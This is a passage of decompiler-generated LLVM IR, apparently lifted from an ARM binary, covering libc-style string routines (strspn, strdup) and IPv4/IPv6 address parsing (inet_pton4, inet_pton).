  %v4_19c24 = inttoptr i32 %v3_19c24 to i8*
  store i8 %v3_19c1c, i8* %v4_19c24, align 1
  %v0_19c28 = load i32, i32* @r1, align 4
  %v1_19c28 = add i32 %v0_19c28, 1
  store i32 %v1_19c28, i32* %r1.global-to-local, align 4
  %v0_19c2c = load i32, i32* %ip.global-to-local, align 4
  %v1_19c2c = add i32 %v0_19c2c, 1
  store i32 %v1_19c2c, i32* %ip.global-to-local, align 4
  %v0_19c30 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19c30, label %.loopexit, label %dec_label_pc_19c34

dec_label_pc_19c34:                               ; preds = %dec_label_pc_19c1c
  %v1_19c34 = add i32 %v0_19c28, 2
  %v2_19c34 = inttoptr i32 %v1_19c34 to i8*
  %v3_19c34 = load i8, i8* %v2_19c34, align 1
  %v4_19c34 = zext i8 %v3_19c34 to i32
  store i32 %v4_19c34, i32* %r3.global-to-local, align 4
  %v2_19c38 = icmp eq i8 %v3_19c34, 0
  store i1 %v2_19c38, i1* %cpsr_z.global-to-local, align 1
  %v3_19c3c = add i32 %v0_19c2c, 2
  %v4_19c3c = inttoptr i32 %v3_19c3c to i8*
  store i8 %v3_19c34, i8* %v4_19c3c, align 1
  %v0_19c40 = load i32, i32* %r1.global-to-local, align 4
  %v1_19c40 = add i32 %v0_19c40, 1
  store i32 %v1_19c40, i32* %r1.global-to-local, align 4
  %v0_19c44 = load i32, i32* %ip.global-to-local, align 4
  %v1_19c44 = add i32 %v0_19c44, 1
  store i32 %v1_19c44, i32* %lr.global-to-local, align 4
  %v0_19c48 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19c48, label %.loopexit, label %dec_label_pc_19c4c

dec_label_pc_19c4c:                               ; preds = %dec_label_pc_19c34
  %v1_19c4c = add i32 %v0_19c40, 2
  %v2_19c4c = inttoptr i32 %v1_19c4c to i8*
  %v3_19c4c = load i8, i8* %v2_19c4c, align 1
  %v4_19c4c = zext i8 %v3_19c4c to i32
  store i32 %v4_19c4c, i32* %ip.global-to-local, align 4
  store i32 %v1_19c4c, i32* %r3.global-to-local, align 4
  %v2_19c54 = icmp eq i8 %v3_19c4c, 0
  store i1 %v2_19c54, i1* %cpsr_z.global-to-local, align 1
  %v3_19c58 = add i32 %v0_19c44, 2
  %v4_19c58 = inttoptr i32 %v3_19c58 to i8*
  store i8 %v3_19c4c, i8* %v4_19c58, align 1
  %v0_19c5c = load i32, i32* %r3.global-to-local, align 4
  %v1_19c5c = add i32 %v0_19c5c, 1
  store i32 %v1_19c5c, i32* @r1, align 4
  %v0_19c60 = load i32, i32* %lr.global-to-local, align 4
  %v1_19c60 = add i32 %v0_19c60, 1
  store i32 %v1_19c60, i32* %lr.global-to-local, align 4
  %v0_19c64 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19c64, label %.loopexit, label %dec_label_pc_19c68

dec_label_pc_19c68:                               ; preds = %dec_label_pc_19c4c
  %v0_19c68 = load i32, i32* %r0.global-to-local, align 4
  %v1_19c68 = add i32 %v0_19c68, -1
  store i32 %v1_19c68, i32* %r0.global-to-local, align 4
  %v7_19c68 = icmp eq i32 %v0_19c68, 1
  store i1 %v7_19c68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19c68, label %dec_label_pc_19c70, label %dec_label_pc_19c08

dec_label_pc_19c70:                               ; preds = %dec_label_pc_19c68
  %v0_19c70 = load i32, i32* %r2.global-to-local, align 4
  %v1_19c70 = urem i32 %v0_19c70, 4
  store i32 %v1_19c70, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19c90

dec_label_pc_19c78:                               ; preds = %dec_label_pc_19c90
  %v0_19c78 = load i32, i32* @r1, align 4
  %v1_19c78 = inttoptr i32 %v0_19c78 to i8*
  %v2_19c78 = load i8, i8* %v1_19c78, align 1
  %v3_19c78 = zext i8 %v2_19c78 to i32
  store i32 %v3_19c78, i32* %ip.global-to-local, align 4
  %v2_19c7c = icmp eq i8 %v2_19c78, 0
  store i1 %v2_19c7c, i1* %cpsr_z.global-to-local, align 1
  %v1_19c80 = add i32 %v1_19c9c, -1
  store i32 %v1_19c80, i32* %r2.global-to-local, align 4
  %v3_19c84 = add i32 %v3_19c9c, 1
  %v4_19c84 = inttoptr i32 %v3_19c84 to i8*
  store i8 %v2_19c78, i8* %v4_19c84, align 1
  %v5_19c84 = load i32, i32* %lr.global-to-local, align 4
  %v6_19c84 = add i32 %v5_19c84, 1
  store i32 %v6_19c84, i32* %lr.global-to-local, align 4
  %v0_19c88 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19c88, label %.loopexit, label %dec_label_pc_19c8c

dec_label_pc_19c8c:                               ; preds = %dec_label_pc_19c78
  %v0_19c8c = load i32, i32* @r1, align 4
  %v1_19c8c = add i32 %v0_19c8c, 1
  store i32 %v1_19c8c, i32* @r1, align 4
  %v0_19c90.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19c90thread-pre-split

dec_label_pc_19c90thread-pre-split:               ; preds = %dec_label_pc_19c8c, %dec_label_pc_19bf8
  %v2_19c846 = phi i32 [ %v6_19c84, %dec_label_pc_19c8c ], [ %v1_19bfc, %dec_label_pc_19bf8 ]
  %v0_19c90.pr = phi i32 [ %v0_19c90.pr.pre, %dec_label_pc_19c8c ], [ %v0_19bf8, %dec_label_pc_19bf8 ]
  br label %dec_label_pc_19c90

dec_label_pc_19c90:                               ; preds = %dec_label_pc_19c90thread-pre-split, %dec_label_pc_19c70
  %v3_19c9c = phi i32 [ %v2_19c846, %dec_label_pc_19c90thread-pre-split ], [ %v1_19c60, %dec_label_pc_19c70 ]
  %v1_19c9c = phi i32 [ %v0_19c90.pr, %dec_label_pc_19c90thread-pre-split ], [ %v1_19c70, %dec_label_pc_19c70 ]
  %v2_19c90 = icmp eq i32 %v1_19c9c, 0
  store i1 %v2_19c90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c90, label %dec_label_pc_19c98, label %dec_label_pc_19c78

dec_label_pc_19c98:                               ; preds = %dec_label_pc_19c90
  %v0_19c98 = load i32, i32* %ip.global-to-local, align 4
  %v2_19c98 = icmp eq i32 %v0_19c98, 0
  store i1 %v2_19c98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c98, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_19c98
  %v4_19c9c = add i32 %v3_19c9c, 1
  %v5_19c9c = inttoptr i32 %v4_19c9c to i8*
  store i8 0, i8* %v5_19c9c, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_19c4c, %dec_label_pc_19c34, %dec_label_pc_19c1c, %dec_label_pc_19c08, %dec_label_pc_19c78, %dec_label_pc_19c98, %bb
  %v0_19ca0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_19ca0, i32* %r0.global-to-local, align 4
  %v2_19ca4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19ca4, i32* @r4, align 4
  ret i32 %v0_19ca0

; uselistorder directives
  uselistorder i32 %v1_19c9c, { 1, 0 }
  uselistorder i32 %v1_19c70, { 1, 0 }
  uselistorder i32 %v0_19c68, { 1, 0 }
  uselistorder i32 %v1_19c60, { 0, 2, 1 }
  uselistorder i32 %v1_19c5c, { 1, 0 }
  uselistorder i32 %v0_19bf8, { 2, 1, 0, 3 }
  uselistorder i32 %v5_19bec, { 1, 0 }
  uselistorder i32 %v0_19bec, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_19ce02 = load i32, i32* @r0, align 4
  %v1_19ce03 = inttoptr i32 %v0_19ce02 to i8*
  %v2_19ce04 = load i8, i8* %v1_19ce03, align 1
  %v3_19ce05 = zext i8 %v2_19ce04 to i32
  store i32 %v3_19ce05, i32* @r2, align 4
  %v2_19ce46 = icmp eq i8 %v2_19ce04, 0
  br i1 %v2_19ce46, label %dec_label_pc_19cf0, label %dec_label_pc_19cbc.preheader

dec_label_pc_19cb4:                               ; preds = %dec_label_pc_19cbc
  %v1_19cc4 = add i32 %v0_19cc4, 1
  %v9_19cb4 = icmp eq i32 %v0_19cd0, %v3_19cbc
  br i1 %v9_19cb4, label %dec_label_pc_19cd0, label %dec_label_pc_19cbc

dec_label_pc_19cbc:                               ; preds = %dec_label_pc_19cbc.preheader, %dec_label_pc_19cb4
  %v0_19cc4 = phi i32 [ %tmp, %dec_label_pc_19cbc.preheader ], [ %v1_19cc4, %dec_label_pc_19cb4 ]
  %v1_19cbc = inttoptr i32 %v0_19cc4 to i8*
  %v2_19cbc = load i8, i8* %v1_19cbc, align 1
  %v3_19cbc = zext i8 %v2_19cbc to i32
  store i32 %v3_19cbc, i32* @ip, align 4
  %v2_19cc0 = icmp eq i8 %v2_19cbc, 0
  br i1 %v2_19cc0, label %dec_label_pc_19cf0, label %dec_label_pc_19cb4

dec_label_pc_19cd0:                               ; preds = %dec_label_pc_19cb4
  %v2_19cd0 = icmp eq i32 %v0_19cd0, 0
  br i1 %v2_19cd0, label %dec_label_pc_19cf0, label %dec_label_pc_19cd8

dec_label_pc_19cd8:                               ; preds = %dec_label_pc_19cd0
  %v1_19cd8 = add i32 %v0_19cd8, 1
  store i32 %v1_19cd8, i32* @lr, align 4
  %v1_19cdc = add i32 %v0_19cdc, 1
  %v1_19ce0 = inttoptr i32 %v1_19cdc to i8*
  %v2_19ce0 = load i8, i8* %v1_19ce0, align 1
  %v3_19ce0 = zext i8 %v2_19ce0 to i32
  store i32 %v3_19ce0, i32* @r2, align 4
  %v2_19ce4 = icmp eq i8 %v2_19ce0, 0
  br i1 %v2_19ce4, label %dec_label_pc_19cf0, label %dec_label_pc_19cbc.preheader

dec_label_pc_19cbc.preheader:                     ; preds = %entry, %dec_label_pc_19cd8
  %v0_19cdc = phi i32 [ %v1_19cdc, %dec_label_pc_19cd8 ], [ %v0_19ce02, %entry ]
  %v0_19cd8 = phi i32 [ %v1_19cd8, %dec_label_pc_19cd8 ], [ 0, %entry ]
  %v0_19cd0 = phi i32 [ %v3_19ce0, %dec_label_pc_19cd8 ], [ %v3_19ce05, %entry ]
  br label %dec_label_pc_19cbc

dec_label_pc_19cf0:                               ; preds = %dec_label_pc_19cd0, %dec_label_pc_19cd8, %dec_label_pc_19cbc, %entry
  %v0_19cf0 = phi i32 [ 0, %entry ], [ %v0_19cd8, %dec_label_pc_19cbc ], [ %v1_19cd8, %dec_label_pc_19cd8 ], [ %v0_19cd8, %dec_label_pc_19cd0 ]
  ret i32 %v0_19cf0

; uselistorder directives
  uselistorder i32 %v3_19cbc, { 1, 0 }
  uselistorder i32 %v0_19cc4, { 1, 0 }
  uselistorder i32* @ip, { 16, 17, 3, 18, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 8, 9, 0, 10, 11, 12, 13, 14, 27, 28, 5, 29, 4, 30, 6, 7, 21, 22, 2, 23, 24, 20, 25, 81, 78, 79, 80, 1, 82, 15, 19, 26, 33, 32, 31, 34, 35 }
  uselistorder label %dec_label_pc_19cf0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19cbc.preheader, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_19cf8 = load i32, i32* @r4, align 4
  store i32 %v3_19cf8, i32* %stack_var_-12, align 4
  %v6_19cf8 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_19d00 = call i32 @strlen(i8* %arg1)
  %v1_19d04 = add i32 %v3_19d00, 1
  store i32 %v1_19d04, i32* @r4, align 4
  %v1_19d0c = call i32 @malloc(i32 %v1_19d04)
  store i32 105760, i32* @lr, align 4
  %v1_19d1c = icmp ne i32 %v1_19d0c, 0
  call void @__pseudo_cond_branch(i1 %v1_19d1c, i32 ptrtoint ([3 x i8]* @global_var_14e70.1090 to i32))
  %v2_19d24 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19d24, i32* @r4, align 4
  store i32 %v6_19cf8, i32* @r5, align 4
  ret i32 %v1_19d0c

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 4, 9, 10, 11, 8, 15, 13, 14, 12, 6, 2, 3, 0, 7, 1, 5 }
  uselistorder i32 (i32)* @malloc, { 8, 5, 4, 14, 15, 7, 6, 13, 12, 11, 10, 9, 3, 2, 1, 0 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_19d28 = load i32, i32* @r5, align 4
  %v2_19d30 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_19d30, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_19db83 = load i8, i8* %arg1, align 1
  %v3_19db84 = zext i8 %v2_19db83 to i32
  %v5_19db85 = add i32 %tmp, 1
  store i32 %v5_19db85, i32* @r4, align 4
  %v2_19dbc6 = icmp eq i8 %v2_19db83, 0
  store i1 %v2_19dbc6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19dbc6, label %dec_label_pc_19dc8, label %dec_label_pc_19d50

dec_label_pc_19d50:                               ; preds = %entry, %dec_label_pc_19db8.backedge
  %v0_19d94 = phi i32 [ %v3_19db8, %dec_label_pc_19db8.backedge ], [ %v3_19db84, %entry ]
  %v1_19dc010.in = phi i32 [ %v3_19db8, %dec_label_pc_19db8.backedge ], [ %v3_19db84, %entry ]
  %v1_19dc010 = add nsw i32 %v1_19dc010.in, -48
  %v2_19d50 = icmp ugt i32 %v1_19dc010, 8
  %v7_19d50 = icmp eq i32 %v1_19dc010, 9
  store i1 %v7_19d50, i1* %cpsr_z.global-to-local, align 1
  %v2_19d58 = xor i1 %v7_19d50, true
  %v3_19d58 = and i1 %v2_19d50, %v2_19d58
  br i1 %v3_19d58, label %dec_label_pc_19d94, label %dec_label_pc_19d5c

dec_label_pc_19d5c:                               ; preds = %dec_label_pc_19d50
  %v0_19d5c = load i32, i32* %r0.global-to-local, align 4
  %v1_19d5c = inttoptr i32 %v0_19d5c to i8*
  %v2_19d5c = load i8, i8* %v1_19d5c, align 1
  %v3_19d5c = zext i8 %v2_19d5c to i32
  %v3_19d64 = mul nuw nsw i32 %v3_19d5c, 10
  %v4_19d64 = add nuw nsw i32 %v3_19d64, %v0_19d94
  %v1_19d68 = add nsw i32 %v4_19d64, -48
  %v2_19d6c = icmp ugt i32 %v1_19d68, 254
  %v7_19d6c = icmp eq i32 %v1_19d68, 255
  store i1 %v7_19d6c, i1* %cpsr_z.global-to-local, align 1
  %v2_19d70 = xor i1 %v7_19d6c, true
  %v3_19d70 = and i1 %v2_19d6c, %v2_19d70
  br i1 %v3_19d70, label %dec_label_pc_19dec, label %dec_label_pc_19d74

dec_label_pc_19d74:                               ; preds = %dec_label_pc_19d5c
  %v0_19d74 = load i32, i32* %r1.global-to-local, align 4
  %v2_19d74 = icmp eq i32 %v0_19d74, 0
  store i1 %v2_19d74, i1* %cpsr_z.global-to-local, align 1
  %v1_19d78 = trunc i32 %v1_19d68 to i8
  store i8 %v1_19d78, i8* %v1_19d5c, align 1
  %v0_19d7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19d7c, label %dec_label_pc_19d80, label %dec_label_pc_19db8.backedge

dec_label_pc_19d80:                               ; preds = %dec_label_pc_19d74
  %v0_19d80 = load i32, i32* @lr, align 4
  %v1_19d80 = add i32 %v0_19d80, 1
  store i32 %v1_19d80, i32* @lr, align 4
  %v7_19d84 = icmp eq i32 %v1_19d80, 4
  store i1 %v7_19d84, i1* %cpsr_z.global-to-local, align 1
  %v0_19d88 = load i32, i32* %r1.global-to-local, align 4
  %v1_19d88 = add i32 %v0_19d88, 1
  store i32 %v1_19d88, i32* %r1.global-to-local, align 4
  %v8_19d8c = icmp sgt i32 %v1_19d80, 4
  br i1 %v8_19d8c, label %dec_label_pc_19dec, label %dec_label_pc_19db8.backedge

dec_label_pc_19d94:                               ; preds = %dec_label_pc_19d50
  %v7_19d94 = icmp eq i32 %v0_19d94, 46
  store i1 %v7_19d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19d94, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_19d94
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19dec

bb:                                               ; preds = %dec_label_pc_19d94
  %v1_19d9c = load i32, i32* %r1.global-to-local, align 4
  %v2_19d9c = urem i32 %v1_19d9c, 2
  %v2_19da0 = icmp eq i32 %v2_19d9c, 0
  store i1 %v2_19da0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_19da0, label %dec_label_pc_19dec, label %dec_label_pc_19dac

dec_label_pc_19dac:                               ; preds = %bb
  %v0_19dac = load i32, i32* @lr, align 4
  %v7_19dac = icmp eq i32 %v0_19dac, 4
  store i1 %v7_19dac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19dac, label %dec_label_pc_19dec, label %dec_label_pc_19db4

dec_label_pc_19db4:                               ; preds = %dec_label_pc_19dac
  %v2_19db4 = load i32, i32* %r0.global-to-local, align 4
  %v3_19db4 = add i32 %v2_19db4, 1
  %v4_19db4 = inttoptr i32 %v3_19db4 to i8*
  store i8 0, i8* %v4_19db4, align 1
  %v5_19db4 = load i32, i32* %r0.global-to-local, align 4
  %v6_19db4 = add i32 %v5_19db4, 1
  store i32 %v6_19db4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19db8.backedge

dec_label_pc_19db8.backedge:                      ; preds = %dec_label_pc_19db4, %dec_label_pc_19d74, %dec_label_pc_19d80
  %v0_19db8 = load i32, i32* @r4, align 4
  %v1_19db8 = inttoptr i32 %v0_19db8 to i8*
  %v2_19db8 = load i8, i8* %v1_19db8, align 1
  %v3_19db8 = zext i8 %v2_19db8 to i32
  %v5_19db8 = add i32 %v0_19db8, 1
  store i32 %v5_19db8, i32* @r4, align 4
  %v2_19dbc = icmp eq i8 %v2_19db8, 0
  store i1 %v2_19dbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19dbc, label %dec_label_pc_19db8.dec_label_pc_19dc8_crit_edge, label %dec_label_pc_19d50

dec_label_pc_19db8.dec_label_pc_19dc8_crit_edge:  ; preds = %dec_label_pc_19db8.backedge
  %v0_19dc8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_19dc8

dec_label_pc_19dc8:                               ; preds = %dec_label_pc_19db8.dec_label_pc_19dc8_crit_edge, %entry
  %v0_19dc8 = phi i32 [ %v0_19dc8.pre, %dec_label_pc_19db8.dec_label_pc_19dc8_crit_edge ], [ 0, %entry ]
  %v7_19dc8 = icmp eq i32 %v0_19dc8, 3
  store i1 %v7_19dc8, i1* %cpsr_z.global-to-local, align 1
  %v7_19dcc = icmp slt i32 %v0_19dc8, 4
  br i1 %v7_19dcc, label %dec_label_pc_19dec, label %dec_label_pc_19dd0

dec_label_pc_19dd0:                               ; preds = %dec_label_pc_19dc8
  %v0_19dd0 = load i32, i32* @r5, align 4
  store i32 %v0_19dd0, i32* @r0, align 4
  store i32 %v2_19d30, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_19ddc = call i32 @memcpy()
  br label %dec_label_pc_19dec

dec_label_pc_19dec:                               ; preds = %dec_label_pc_19d5c, %dec_label_pc_19d80, %bb, %dec_label_pc_19dac, %.thread12, %dec_label_pc_19dc8, %dec_label_pc_19dd0
  %storemerge = phi i32 [ 1, %dec_label_pc_19dd0 ], [ 0, %dec_label_pc_19dc8 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_19dac ], [ 0, %bb ], [ 0, %dec_label_pc_19d80 ], [ 0, %dec_label_pc_19d5c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_19d28, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_19dc8, { 1, 0 }
  uselistorder i32 %v3_19db8, { 1, 0 }
  uselistorder i32 %v0_19d94, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 11, 3, 4, 1, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_19dec, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_19db8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19d50, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_19df4 = load i32, i32* @r4, align 4
  %v6_19df4 = load i32, i32* @r5, align 4
  %v9_19df4 = load i32, i32* @r6, align 4
  %v7_19df8 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_19df8, label %dec_label_pc_19e18, label %dec_label_pc_19e0c

dec_label_pc_19e0c:                               ; preds = %entry
  %v7_19e0c = icmp eq i32 %arg1, 10
  br i1 %v7_19e0c, label %dec_label_pc_19e2c, label %dec_label_pc_19fdc

dec_label_pc_19e18:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_19e20 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_19e20, i32* %r0.global-to-local, align 4
  store i32 %v4_19e20, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19ff4

dec_label_pc_19e2c:                               ; preds = %dec_label_pc_19e0c
  %v2_19e2c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_19e2c, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_19e38 = bitcast i32* %stack_var_-52 to i8*
  %v3_19e38 = call i32 @__GI_memset(i8* %v2_19e38, i32 0)
  store i32 %v3_19e38, i32* %r0.global-to-local, align 4
  %v0_19e3c = load i32, i32* @r6, align 4
  %v1_19e3c = inttoptr i32 %v0_19e3c to i8*
  %v2_19e3c = load i8, i8* %v1_19e3c, align 1
  %v3_19e3c = zext i8 %v2_19e3c to i32
  store i32 %v3_19e3c, i32* %r3.global-to-local, align 4
  %v7_19e40 = icmp eq i8 %v2_19e3c, 58
  store i32 %v3_19e38, i32* @r4, align 4
  %v2_19e48 = add i32 %v3_19e38, 16
  store i32 %v2_19e48, i32* %r8.global-to-local, align 4
  br i1 %v7_19e40, label %dec_label_pc_19e50, label %dec_label_pc_19e5c

dec_label_pc_19e50:                               ; preds = %dec_label_pc_19e2c
  %v1_19e50 = add i32 %v0_19e3c, 1
  %v2_19e50 = inttoptr i32 %v1_19e50 to i8*
  %v3_19e50 = load i8, i8* %v2_19e50, align 1
  %v4_19e50 = zext i8 %v3_19e50 to i32
  store i32 %v4_19e50, i32* %r3.global-to-local, align 4
  store i32 %v1_19e50, i32* @r6, align 4
  %v7_19e54 = icmp eq i8 %v3_19e50, 58
  br i1 %v7_19e54, label %dec_label_pc_19e5c, label %dec_label_pc_19ff0

dec_label_pc_19e5c:                               ; preds = %dec_label_pc_19e50, %dec_label_pc_19e2c
  %v0_19e60 = phi i32 [ %v1_19e50, %dec_label_pc_19e50 ], [ %v0_19e3c, %dec_label_pc_19e2c ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_19e60, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_19f3c7 = inttoptr i32 %v0_19e60 to i8*
  %v2_19f3c8 = load i8, i8* %v1_19f3c7, align 1
  %v3_19f3c9 = zext i8 %v2_19f3c8 to i32
  store i32 %v3_19f3c9, i32* %r0.global-to-local, align 4
  %v1_19f4010 = call i32 @__GI_tolower(i32 %v3_19f3c9)
  store i32 %v1_19f4010, i32* %r0.global-to-local, align 4
  store i32 %v1_19f4010, i32* @r5, align 4
  %v2_19f4412 = icmp eq i32 %v1_19f4010, 0
  br i1 %v2_19f4412, label %dec_label_pc_19f4c, label %dec_label_pc_19e70

dec_label_pc_19e70:                               ; preds = %dec_label_pc_19e5c, %dec_label_pc_19f3c.backedge
  %v0_19e74 = phi i32 [ %v1_19f40, %dec_label_pc_19f3c.backedge ], [ %v1_19f4010, %dec_label_pc_19e5c ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_19f3c.backedge ], [ 0, %dec_label_pc_19e5c ]
  store i32 ptrtoint ([17 x i8]* @global_var_1e264.1182 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1e264.1182 to i32), i32* %r0.global-to-local, align 4
  %v3_19e7c = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1e264.1182 to i32), i32 %v0_19e74)
  %v4_19e7c = trunc i32 %v3_19e7c to i8
  store i32 %v3_19e7c, i32* %r0.global-to-local, align 4
  %v3_19e80 = icmp eq i8 %v4_19e7c, 0
  %v0_19e84 = load i32, i32* @r6, align 4
  %v1_19e84 = add i32 %v0_19e84, 1
  store i32 %v1_19e84, i32* @r6, align 4
  br i1 %v3_19e80, label %dec_label_pc_19ea0, label %dec_label_pc_19e8c

dec_label_pc_19e8c:                               ; preds = %dec_label_pc_19e70
  %v0_19e8c = load i32, i32* %sb.global-to-local, align 4
  %v2_19e8c = sext i8 %v4_19e7c to i32
  %v3_19e8c = sub i32 %v2_19e8c, %v0_19e8c
  store i32 %v3_19e8c, i32* %r3.global-to-local, align 4
  %v1_19e90 = load i32, i32* %r7.global-to-local, align 4
  %v4_19e90 = mul i32 %v1_19e90, 16
  %v5_19e90 = or i32 %v4_19e90, %v3_19e8c
  store i32 %v5_19e90, i32* %r7.global-to-local, align 4
  %v3_19e98 = icmp ult i32 %v5_19e90, 65534
  br i1 %v3_19e98, label %dec_label_pc_19f34, label %dec_label_pc_19ff0

dec_label_pc_19ea0:                               ; preds = %dec_label_pc_19e70
  %v0_19ea0 = load i32, i32* @r5, align 4
  %v7_19ea0 = icmp eq i32 %v0_19ea0, 58
  br i1 %v7_19ea0, label %dec_label_pc_19ea8, label %dec_label_pc_19f04

dec_label_pc_19ea8:                               ; preds = %dec_label_pc_19ea0
  %v4_19ea82 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_19ea82, i32* %r3.global-to-local, align 4
  %v2_19eac = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_19eac, label %dec_label_pc_19eb4, label %dec_label_pc_19ec8

dec_label_pc_19eb4:                               ; preds = %dec_label_pc_19ea8
  %v0_19eb4 = load i32, i32* %fp.global-to-local, align 4
  %v2_19eb4 = icmp eq i32 %v0_19eb4, 0
  br i1 %v2_19eb4, label %dec_label_pc_19ebc, label %dec_label_pc_19ff0

dec_label_pc_19ebc:                               ; preds = %dec_label_pc_19eb4
  %v0_19ebc = load i32, i32* @r4, align 4
  store i32 %v0_19ebc, i32* %fp.global-to-local, align 4
  store i32 %v1_19e84, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_19f3c.backedge

dec_label_pc_19ec8:                               ; preds = %dec_label_pc_19ea8
  %v1_19ec8 = inttoptr i32 %v1_19e84 to i8*
  %v2_19ec8 = load i8, i8* %v1_19ec8, align 1
  %v3_19ec8 = zext i8 %v2_19ec8 to i32
  store i32 %v3_19ec8, i32* %r3.global-to-local, align 4
  %v2_19ecc = icmp eq i8 %v2_19ec8, 0
  br i1 %v2_19ecc, label %dec_label_pc_19ff0, label %dec_label_pc_19ed4

dec_label_pc_19ed4:                               ; preds = %dec_label_pc_19ec8
  %v0_19ed4 = load i32, i32* @r4, align 4
  %v1_19ed4 = add i32 %v0_19ed4, 2
